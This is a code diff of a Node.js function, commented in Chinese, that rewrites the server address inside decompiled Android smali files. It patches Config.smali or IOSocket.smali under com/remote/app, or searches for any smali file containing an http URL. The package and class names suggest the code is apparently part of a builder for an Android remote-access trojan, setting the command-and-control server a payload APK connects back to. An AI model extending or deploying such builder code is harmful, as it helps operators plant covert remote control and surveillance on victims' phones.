@@ -58,32 +58,73 @@ function canUseApkTool() {
 }
 
 /**
+ * 递归查找包含服务器地址的smali文件
+ * @param {string} dir - 搜索目录
+ * @returns {string|null} - 找到的文件路径或null
+ */
+function findSmaliWithServerUrl(dir) {
+    const files = fs.readdirSync(dir);
+    
+    for (const file of files) {
+        const fullPath = path.join(dir, file);
+        const stat = fs.statSync(fullPath);
+        
+        if (stat.isDirectory()) {
+            const result = findSmaliWithServerUrl(fullPath);
+            if (result) return result;
+        } else if (file.endsWith('.smali')) {
+            const content = fs.readFileSync(fullPath, 'utf8');
+            // 查找包含http://模式的行
+            if (/http:\/\/[^"\s]+/.test(content)) {
+                return fullPath;
+            }
+        }
+    }
+    
+    return null;
+}
+
+/**
  * 使用ApkTool修改smali文件中的服务器地址（无需Android SDK）
  * @param {string} URI - 服务器地址
  * @param {string} PORT - 服务器端口
- * @param {function} cb - 回调函数
+ * @param {function} callback - 回调函数
  */
 function patchApkTool(URI, PORT, callback) {
-    // 首先尝试Config.smali（新版代码结构）
-    const configSmaliPath = path.join(CONST.smaliPath, '/smali/com/remote/app/Config.smali');
-    const iosocketSmaliPath = CONST.patchFilePath;
+    // 首先尝试已知位置
+    const smaliBasePath = path.join(CONST.smaliPath, 'smali');
+    const configSmaliPath = path.join(smaliBasePath, 'com/remote/app/Config.smali');
+    const iosocketSmaliPath = path.join(smaliBasePath, 'com/remote/app/IOSocket.smali');
     
     let targetFile = null;
-    let patchPattern = null;
+    let patchPattern = /http:\/\/[^"\s]+/;  // 通用HTTP URL匹配
+    let replacementMode = 'simple';  // simple 或 const-string
     
     // 检测使用哪个文件
     if (fs.existsSync(configSmaliPath)) {
         targetFile = configSmaliPath;
-        // Config.smali中的模式：const-string v0, "http://..."
         patchPattern = /const-string v\d+, "http:\/\/[^"]*"/;
+        replacementMode = 'const-string';
     } else if (fs.existsSync(iosocketSmaliPath)) {
         targetFile = iosocketSmaliPath;
-        // IOSocket.smali中的旧模式
-        patchPattern = /http:\/\/[^"?]+(?::\d+)?/;
     } else {
-        // 搜索任何包含http://的smali文件
-        return callback('未找到可修补的smali文件，请确保decompiled目录存在');
+        // 自动搜索任何包含http://的smali文件
+        console.log('正在搜索包含服务器地址的smali文件...');
+        targetFile = findSmaliWithServerUrl(smaliBasePath);
+        
+        if (!targetFile) {
+            return callback('未找到包含服务器地址的smali文件，请确保decompiled目录存在且包含有效的APK代码');
+        }
+        
+        // 检查是否是const-string模式
+        const content = fs.readFileSync(targetFile, 'utf8');
+        if (/const-string v\d+, "http:\/\/[^"]*"/.test(content)) {
+            patchPattern = /const-string v\d+, "http:\/\/[^"]*"/;
+            replacementMode = 'const-string';
+        }
     }
+    
+    console.log('找到目标文件:', targetFile);
     
     fs.readFile(targetFile, 'utf8', function (err, data) {
         if (err) return callback('读取smali文件失败: ' + err.message);
@@ -91,7 +132,7 @@ function patchApkTool(URI, PORT, callback) {
         const serverUrl = `http://${URI}:${PORT}`;
         
         let result;
-        if (targetFile.includes('Config.smali')) {
+        if (replacementMode === 'const-string') {
             // 新版模式：替换const-string
             result = data.replace(patchPattern, `const-string v0, "${serverUrl}"`);
         } else {
